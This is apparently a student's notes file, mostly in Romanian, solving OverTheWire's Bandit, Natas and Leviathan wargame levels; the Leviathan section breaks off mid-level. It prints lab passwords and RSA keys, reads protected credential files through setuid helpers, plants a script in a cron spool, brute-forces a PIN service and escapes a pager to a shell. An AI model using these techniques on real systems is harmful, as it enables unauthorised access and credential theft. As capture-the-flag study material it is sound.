@@ -1,0 +1,930 @@
+*Bandit
+Level 1
+	cat readme
+boJ9jbbUNNfktd78OOpsqOltutMc3MY1
+
+Level 2
+	cat ./-
+CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
+
+Level 3
+	cat 'spaces in this filename' 
+UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
+
+Level 4
+ 	cd inhere/
+	ls -a
+	cat .hidden
+pIwrPrtPN36QITSp3EQaw936yaFoFgAB
+
+Level 5
+	file ./inhere/*
+	cat ./inhere/-file07
+koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+
+Level 6
+	find ./inhere -type f -size 1033c -not -executable 
+	cat ./inhere/maybehere07/.file2
+DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+
+Level 7
+	find / -user bandit7 -group bandit6 -size 33c
+	cat /var/lib/dpkg/info/bandit7.password
+HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+
+Level 8
+	cat data.txt | egrep -o "millionth.+"
+cvX2JJa4CFALtqS87jk27qwqGhBM9plV
+
+Level 9
+	sort data.txt | uniq -u
+UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
+
+Level 10
+	strings data.txt | egrep "[=]+"
+truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+
+Level 11
+	base64 -d data.txt 
+IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
+
+Level 12
+	cat data.txt | tr [n-za-mN-ZA-M] [a-zA-Z] 
+5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+
+Level 13
+	xxd -r data.txt > /tmp/ionut/data
+	 mv data data2.gz
+	gzip -d data2.gz
+	mv data2 data3.bz
+	mv data3 data4.gz
+	gzip -d data4.gz
+	mv data4 data5.tar
+	tar -xf data5.tar
+	mv data5.bin data6.tar
+	tar -xf data6.tar
+	mv data6.bin data7.bz
+	bzip2 -d data7.bz
+	mv data7 data8.tar
+	tar -xf data8.tar
+	mv data8.bin data9.gz
+	gzip -d data9.gz
+	cat data9
+8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+
+Level 14
+	ssh bandit14@localhost -i sshkey.private
+	cat /etc/bandit_pass/bandit14
+4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+
+Level 15
+	echo "4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e" | nc localhost 30000
+BfMYroe26WYalil77FoDi9qh59eK5xNr
+
+Level 16
+openssl -generare de chei private
+-ign_eof -impiedica oprirea conexiunii dupa terminarea trimiterii fisierului 
+	echo "BfMYroe26WYalil77FoDi9qh59eK5xNr" | openssl s_client -connect localhost:30001 -ign_eof
+cluFn7wTiGryunymYOu4RcffSxQluehd
+
+Level 17
+nmap -sV -T4 -p 31000-32000 localhost
+nmap -monitorizarea hosturilor si traficului, explorarea retelei
+-s -afisarea fiecarui hst din retea, fara a trimite pachete
+-V -printare versiune
+-T4 -nivelul de agresivitate, din punct de vedere al vitezei(5 fiind maximul)
+output:
+31046/tcp open     echo
+31518/tcp filtered unknown
+31691/tcp open     echo
+31790/tcp open     ssl/unknown
+31960/tcp open     echo
+-observam ca pe portul 31790 este singurul trafic ssl
+-folosindu-ne de comanda invatata la nivelul anterior, vom genera o cheie privata ->echo "cluFn7wTiGryunymYOu4RcffSxQluehd" | openssl s_client -connect localhost:31790 -ign_eof
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+
+-vom crea un nou fisier, cu continutul RSA, pe care il vom rula pentru a optine cheia nivelului
+-pentru ca nu avem permisiune de scriere, vom reveni la bandit12
+-vom crea fisierul sshkey.private, in care vom scrie cheia RSA
+-il vom deschide folosind vim, o sa ii schimbam permisiunile cu ajutorul comenzii: chmod 400 sshkey.private, pentru a deveni citibil doar pentru owner
+-pentru conectarea la bandit17, folosim comanda: ssh -i sshkey.private bandit17@localhost, comanda folosita si la Level14
+-pentru a optine parola:  cat /etc/cat /etc/bandit_pass/bandit17
+xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
+
+Level 18
+	diff passwords.new passwords.old
+Output:
+42c42
+< kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+---
+> w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii
+-pentru ca fisierul password.new este primul argument, parola este:
+kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+
+Level 19
+	ssh bandit18@bandit.labs.overthewire.org -p 2220 "cat ~/readme"
+-suntem deconectati automat, imediat dupa logare, deci nu putem accesa readme, unde este stocata parola, din interiorul conexiunii
+-astfel folosim optiunea lui ssh de a executa o comanda si folosim: cat ~/readme
+IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
+Level 20
+	./bandit20-do 
+Run a command as another user.
+  Example: ./bandit20-do id
+	./bandit20-do id
+uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
+	ls /etc/bandit_pass/bandit*
+/etc/bandit_pass/bandit0   /etc/bandit_pass/bandit2   /etc/bandit_pass/bandit30
+/etc/bandit_pass/bandit1   /etc/bandit_pass/bandit20  /etc/bandit_pass/bandit31
+/etc/bandit_pass/bandit10  /etc/bandit_pass/bandit21  /etc/bandit_pass/bandit32
+/etc/bandit_pass/bandit11  /etc/bandit_pass/bandit22  /etc/bandit_pass/bandit33
+/etc/bandit_pass/bandit12  /etc/bandit_pass/bandit23  /etc/bandit_pass/bandit4
+/etc/bandit_pass/bandit13  /etc/bandit_pass/bandit24  /etc/bandit_pass/bandit5
+/etc/bandit_pass/bandit14  /etc/bandit_pass/bandit25  /etc/bandit_pass/bandit6
+/etc/bandit_pass/bandit15  /etc/bandit_pass/bandit26  /etc/bandit_pass/bandit7
+/etc/bandit_pass/bandit16  /etc/bandit_pass/bandit27  /etc/bandit_pass/bandit8
+/etc/bandit_pass/bandit17  /etc/bandit_pass/bandit28  /etc/bandit_pass/bandit9
+/etc/bandit_pass/bandit18  /etc/bandit_pass/bandit29
+/etc/bandit_pass/bandit19  /etc/bandit_pass/bandit3
+	cat /etc/bandit_pass/bandit20
+cat: /etc/bandit_pass/bandit20: Permission denied
+	-vom rula aceeasi comanda folosindu-ne de fisierul existent in homedirectory
+	./bandit20-do cat /etc/bandit_pass/bandit20
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+Level 21
+	./suconnect 
+Usage: ./suconnect <portnumber>
+This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.
+-activam un servar TCP care va asculta pe un port dat ca argument, in background: 54333
+	echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -l localhost -p 54333 &
+-rulam prima comanda, specificand si portul dat de noi ca argument in initializarea serverului 
+	./suconnect 54333
+Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+Password matches, sending next password
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+[1]+  Done                    echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -l localhost -p 54333
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+Level 22
+	cd /etc/cron.d/
+	ls
+cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
+cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
+-ne intereseaza banditul22
+	cat cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+-vom continua prin a analiza /usr/bin/cronjob_bandit22.sh
+	cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+-continuam cu fisierul /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+	cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+Level 23
+	cd /etc/cron.d/
+	ls
+cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
+cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
+	cat cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+	cat /usr/bin/cronjob_bandit23.sh 
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+	cd /etc/bandit_pass
+	echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+	cd
+	cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+Level 24
+	ls /etc/cron.d/
+cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root
+	cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+	cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+myname=$(whoami)
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+-analizand acest script, putem vedea ca orice este salvat in /var/spool/bandit24 va fi sters ori de cate ori este rulat de catre bandit23, dupa 60 de secunde
+-trebuie sa scriem scriptul pestru aflarea parolei intr-o noua locatie, folosindu-ne de /var/spool/bandit24
+	mkdir /tmp/rand
+	cd /tmp/rand
+	vim pass.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/b23/password
+	touch password
+-oferim permisiunile lui "badit24" tutror utilizatorilor, astfel incat sa se poata scrie parola in fisierul /tmp/b23/password
+	chmod 777 -R /tmp/rand
+-copiem noul script in locatia celui rulat de sistem
+	cp script.sh /var/spool/bandit24
+-dupa 60 se secunde, in fisierul /tmp/b23/password va putea sa fie vizibila parola:
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+Level 25
+	nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+-vom crea un script pentru generarea tuturor posibilitatilor de pin format din 4 cifre.
+-scriptul bruteforcescript.sh contine codul necesar generarii:
+#!/bin/bash
+for i in {0000..9999}
+do 
+	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+done
+-vom executa scriptul, iar output-ul in vom redirectiona catre fisierul combinations.txt
+	./bruteforcescript.sh > combinations.txt
+-ultimul pas este sa realizam conexiunea, iar parolele necesare sa fie citite din fisirul combinations.txt
+	nc localhost 30002 < combinations.txt
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+
+Level 26
+	cat bandit26.sshkey
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
+pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
+/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
+xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
+1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
+3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
+qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
+il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
+e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
+Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
+zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
+c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
+wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
+tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
+2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
+i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
+6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
+pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
+JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
+JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
+1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
+ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
+euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
+/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
+IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
+-----END RSA PRIVATE KEY-----
+
+-ni se spune ca shell-ul pentru bandit26 nu este bash, verificam alte posibilitati
+	cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+bandit25@bandit:~$ 
+	cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+-observam ca imediat dupa incercarea de conectare la bandit27, prin intermediul ssh -i bandit26.sshkey -t bandit26@localhost cat text.txt, datorita instructiunii exit(0) vom fi delogati
+-pentru a putea totusi sa ramanem logati, trebuie sa fortam aparitia optiunii "more", prin minimizarea promptului
+-apoi introducem "v" pentru un editor built-text
+-iar pentru obtinerea cheii, introducem: :e /etc/bandit_pass/bandit26, iar parola va deveni vizibila
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z 
+
+Level 27
+-repetam procedeul anterior, in ceea ce priveste minimizarea promptului
+-dupa apasarea tastei "v", urmeaza introducerea urmatoarelor comenzi, pentru optinerea shell-ului:
+SHIFT+"+":set shell=/bin/bash
+SHIFT+"+":shell
+	ls
+bandit27-do  text.txt
+	./bandit27-do 
+Run a command as another user.
+  Example: ./bandit27-do id
+	./bandit27-do cat /etc/bandit_pass/bandit27
+3ba3118a22e93127a4ed485be72ef5ea
+
+Level 28
+-cream un nou director, unde sa clonam fisierul
+	mkdir /tmp/b27
+	cd /tmp/b27
+-efectuam clona
+	git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+	ls
+repo
+	cd repo
+	ls
+README
+	cat README 
+The password to the next level is: 
+0ef186ac70e04ea33b4c1853d2526fa2
+
+Level 29
+	mkdir /tmp/b28
+	cd /tmp/b28
+	git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
+	ls
+repo
+	cd repo
+	ls
+README.md
+	cat README.md 
+# Bandit Notes
+Some notes for level29 of bandit.
+
+## credentials
+
+- username: bandit29
+- password: xxxxxxxxxx
+
+	git log
+commit edd935d60906b33f0619605abd1689808ccdd5ee
+Author: Morla Porla <morla@overthewire.org>
+Date:   Thu May 7 20:14:49 2020 +0200
+
+    fix info leak
+
+commit c086d11a00c0648d095d04c089786efef5e01264
+Author: Morla Porla <morla@overthewire.org>
+Date:   Thu May 7 20:14:49 2020 +0200
+
+    add missing data
+
+commit de2ebe2d5fd1598cd547f4d56247e053be3fdc38
+Author: Ben Dover <noone@overthewire.org>
+Date:   Thu May 7 20:14:49 2020 +0200
+
+    initial commit of README.md
+	git checkout c086d11a00c0648d095d04c089786efef5e01264 ->pentru vizibilitatea parolei in fisierul README.md
+Previous HEAD position was edd935d... fix info leak
+HEAD is now at c086d11... add missing data
+-acut daca executam cat README.md
+# Bandit Notes
+Some notes for level29 of bandit.
+
+## credentials
+
+- username: bandit29
+- password: bbc96594b4e001778eee9975372716b2
+bbc96594b4e001778eee9975372716b2
+
+Level 30
+	mkdir /tmp/b29
+	cd /tmp/b29
+	git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
+	ls
+	cd repo
+	cat README.md
+# Bandit Notes
+Some notes for bandit30 of bandit.
+
+## credentials
+
+- username: bandit30
+- password: <no passwords in production!>
+
+-afisarea tutror branche-urilor existente
+	git branch -a
+* master
+  remotes/origin/HEAD -> origin/master
+  remotes/origin/dev
+  remotes/origin/master
+  remotes/origin/sploits-dev
+
+-schimbam branche-ul catre remotes/origin/dev pentru a gasi parola
+	git checkout dev
+Branch dev set up to track remote branch dev from origin.
+Switched to a new branch 'dev'
+	cat README.md 
+# Bandit Notes
+Some notes for bandit30 of bandit.
+
+## credentials
+
+- username: bandit30
+- password: 5b90576bedb2cc04c86a9e924ce42faf
+5b90576bedb2cc04c86a9e924ce42faf
+
+Level 31
+	mkdir /tmp/b30
+	cd /tmp/b30
+	git clone ssh://bandit30-git@localhost/home/bandit30-git/repo
+	cd repo
+	ls
+README.md
+	cat README.md 
+just an epmty file... muahaha
+
+-comenzile utilizate la punctele anterioare, nu ofera informatiile necesare acestui level
+	git log
+commit 3aefa229469b7ba1cc08203e5d8fa299354c496b
+Author: Ben Dover <noone@overthewire.org>
+Date:   Thu May 7 20:14:54 2020 +0200
+
+    initial commit of README.md
+	git branch -a
+* master
+  remotes/origin/HEAD -> origin/master
+  remotes/origin/master
+	man git
+-git tag -> da posibilitatea programatorilor sa isi marcheze anumite date importante ale proiectelor lor
+	git tag
+secret
+	git show secret
+47e603bb428404d265f59c42920d81e5
+
+Level 32
+	kdir /tmp/b31
+	cd /tmp/b31
+	git clone ssh://bandit31-git@localhost/home/bandit31-git/repo
+	cd repo
+	ls
+README.md
+	cat README.md 
+This time your task is to push a file to the remote repository.
+
+Details:
+    File name: key.txt
+    Content: 'May I come in?'
+    Branch: master
+
+-nici in acest nivel nu ne sunt de folos comenzile folosite anterior
+	git log
+commit 701b33b545902a670a46088731949ae040983d80
+Author: Ben Dover <noone@overthewire.org>
+Date:   Thu May 7 20:14:56 2020 +0200
+
+    initial commit
+
+	git branch -a
+* master
+  remotes/origin/HEAD -> origin/master
+  remotes/origin/master
+	git tag
+	git show
+commit 701b33b545902a670a46088731949ae040983d80
+Author: Ben Dover <noone@overthewire.org>
+Date:   Thu May 7 20:14:56 2020 +0200
+
+    initial commit
+
+diff --git a/.gitignore b/.gitignore
+new file mode 100644
+index 0000000..2211df6
+--- /dev/null
++++ b/.gitignore
+@@ -0,0 +1 @@
++*.txt
+diff --git a/README.md b/README.md
+new file mode 100644
+index 0000000..0edecc0
+--- /dev/null
++++ b/README.md
+@@ -0,0 +1,7 @@
++This time your task is to push a file to the remote repository.
++
++Details:
++    File name: key.txt
++    Content: 'May I come in?'
++    Branch: master
++
+
+	man git
+-git add -adaugarea unui fisier nou in branche
+-git commit -salveaza local modificarile facute
+-git push -pune un fisier in remote reponsitory
+
+	vim key.txt
+	cat key.txt 
+May I come in?
+	git add .
+	git commit 
+On branch master
+Your branch is up-to-date with 'origin/master'.
+nothing to commit, working tree clean
+	git add key.txt 
+The following paths are ignored by one of your .gitignore files:
+key.txt
+Use -f if you really want to add them.
+-in urma erori, care ne spune ca .gitignore va ignora fisierele care se termina in .txt, vom forta adaugarea prin optiunea -f
+	git add key.txt -f
+
+	git commit 
+Unable to create directory /home/bandit31/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+[master 8071bd0] May I come in?
+ 1 file changed, 1 insertion(+)
+ create mode 100644 key.txt
+
+	git push
+Could not create directory '/home/bandit31/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit31-git@localhost's password: 
+Counting objects: 3, done.
+Delta compression using up to 2 threads.
+Compressing objects: 100% (2/2), done.
+Writing objects: 100% (3/3), 327 bytes | 0 bytes/s, done.
+Total 3 (delta 0), reused 0 (delta 0)
+remote: ### Attempting to validate files... ####
+remote: 
+remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+remote: 
+remote: Well done! Here is the password for the next level:
+remote: 56a9bf19c63d650ce78e6ec0354ee45e
+56a9bf19c63d650ce78e6ec0354ee45e
+
+Level 33
+	>> $0
+	$ ls -la
+total 28
+drwxr-xr-x  2 root     root     4096 May  7  2020 .
+drwxr-xr-x 41 root     root     4096 May  7  2020 ..
+-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
+-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
+-rw-r--r--  1 root     root      675 May 15  2017 .profile
+-rwsr-x---  1 bandit33 bandit32 7556 May  7  2020 uppershell
+	$ cat /etc/bandit_pass/bandit33
+c9c3199ddf4121b10cf581a98d51caee
+
+
+*Natas
+Level 0
+-click dreapta + View Page Source
+<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
+
+Level 1
+-deoarece opriunea de click dreapta este blocata, vom apasa tasta F12, din meniurile deschise, in partea stanga (consola), in sectiunea <div id="content"> se va regasi parola
+ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+
+Level 2
+-click dreapta + View Page Source
+-observam existenta unei surse files/pixel.png
+-vom accesa files prin intermediul URL-ului initial, adaugand files/ la final
+-din "Index of /files deschidem fisierul users.txt:
+# username:password
+alice:BYNdCesZqW
+bob:jw2ueICLvT
+charlie:G5vCxkVV3m
+natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+eve:zo4mJWyNj2
+mallory:9urtcpzBmH
+sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+Level 3
+-click dreapta + View Page Source
+<!-- No more information leaks!! Not even Google will find it this time... -->
+
+-intelegem ca s-a folosit un web robot = program care traverseaza Web-ul in mod automat
+-accesam robotul asociat URL-ului nostru
+http://natas3.natas.labs.overthewire.org/robots.txt
+User-agent: *
+Disallow: /s3cr3t/
+-observam ca in campul disallow, care spune robotului ce site-uri nu are voie sa viziteze, este "/s3cr3t/"
+-vom deschide URL-ul aferent
+http://natas3.natas.labs.overthewire.org/s3cr3t/
+-deschidem fisierul users.txt
+natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+
+*Leviathan
+Level 1
+	ls -a
+.  ..  .backup  .bash_logout  .bashrc  .profile
+	cd .backup
+	ls -a
+.  ..  bookmarks.html
+- un cat simplu asupra fisierului bookmarks.html ne ofera foarte multe informatii si ar fi dificil sa aflam daca se regasesc si informatiile care ne intereseaza, astfel, vom cauta in functie de cuvantul cheie "leviathan1"
+	cat bookmarks.html | egrep leviathan1
+<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
+-> rioGegei8m	
+
+Level 2
+	ls
+check
+	./check
+password: 1234
+Wrong password, Good Bye ...
+-observam ca scriptul compara parola introdusa cu o alta parola
+-pentru a avea acces la cod, vom folosi comanda ltrace-care este executa comenzile pas cu pas, cat timp acestea exista:
+	ltrace ./check
+__libc_start_main(0x804853b, 1, 0xffffd784, 0x8048610 <unfinished ...>
+printf("password: ")                             = 10
+getchar(1, 0, 0x65766f6c, 0x646f6700password: 1234
+)            = 49
+getchar(1, 0, 0x65766f6c, 0x646f6700)            = 50
+getchar(1, 0, 0x65766f6c, 0x646f6700)            = 51
+strcmp("123", "sex")                             = -1
+puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
+)             = 29
++++ exited (status 0) +++
+-observam ca parola corecta este cuvantul "sex"
+-introducem parola corecta si ni se va deschide in terminal un non-root user
+	./check
+password: sex
+$ 
+-verificam cu ce utilizator suntem conectat
+	$ whoami
+leviathan2
+-pentru ca suntem conectat cu utilizatorul leviathan2, vom accesa direct fisierul /etc/leviathan_pass/leviathan2, unde ar trebui sa se regaseasca parola
+	$ cat /etc/leviathan_pass/leviathan2
+ougahZi8Ta
+
+Level 3
+	ls
+printfile
+	./printfile
+*** File Printer ***
+Usage: ./printfile filename
+-adaugam un fisier ca argument, fisierul in care ar trebui sa se afle parola
+	./printfile /etc/leviathan_pass/leviathan3
+You cant have that file...
+-vom incerca sa aflam cum functineaza scriptul printfile prin intermediul unui alt fisier
+	ltrace ~/printfile test.txt
+__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
+access("test.txt", 4)                            = 0
+snprintf("/bin/cat test.txt", 511, "/bin/cat %s", "test.txt") = 17
